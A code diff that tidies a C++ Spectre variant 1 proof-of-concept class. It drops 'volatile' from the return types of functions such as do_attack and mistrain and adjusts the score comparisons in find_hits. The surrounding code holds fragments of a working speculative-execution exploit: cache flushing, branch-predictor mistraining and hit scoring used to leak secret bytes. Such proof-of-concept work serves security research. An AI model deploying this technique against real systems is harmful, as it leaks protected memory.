@@ -34,11 +34,12 @@ volatile void Spectrev1::read_byte(const volatile void *p_secret, uint8_t *p_val
         {
             break;
         }
+
     }
     *p_val = high;
 }
 
-inline volatile void Spectrev1::do_attack(size_t train_x, size_t mal_x)
+inline void Spectrev1::do_attack(size_t train_x, size_t mal_x)
 {
     // Flush every cache line in p_scratchpad
     for (volatile auto i = 0; i < MAX_BYTE*block_len; i += cachelinesize)
@@ -50,7 +51,7 @@ inline volatile void Spectrev1::do_attack(size_t train_x, size_t mal_x)
     find_hits(train_x);
 }
 
-inline volatile void Spectrev1::mistrain(size_t train_x, size_t mal_x)
+inline void Spectrev1::mistrain(size_t train_x, size_t mal_x)
 {
     volatile uint64_t x;
     for (int i = (n_trainings*(n_trainings+1))-1; i >= 0; --i)
@@ -64,7 +65,7 @@ inline volatile void Spectrev1::mistrain(size_t train_x, size_t mal_x)
     }
 }
 
-inline volatile void Spectrev1::find_hits(size_t train_x)
+inline void Spectrev1::find_hits(size_t train_x)
 {
     high = high2 = -1;
     int mix_i, i;
@@ -80,12 +81,12 @@ inline volatile void Spectrev1::find_hits(size_t train_x)
     // Find the two highest scores
     for (i = 0; i < MAX_BYTE; ++i)
     {
-        if (high == -1 || results[i] >= results[high])
+        if (high < 0 || results[i] >= results[high])
         {
             high2 = high;
             high = i;
         }
-        else if (high2 == -1 || results[i] >= results[high2])
+        else if (high2 < 0 || results[i] >= results[high2])
         {
             high2 = i;
         }
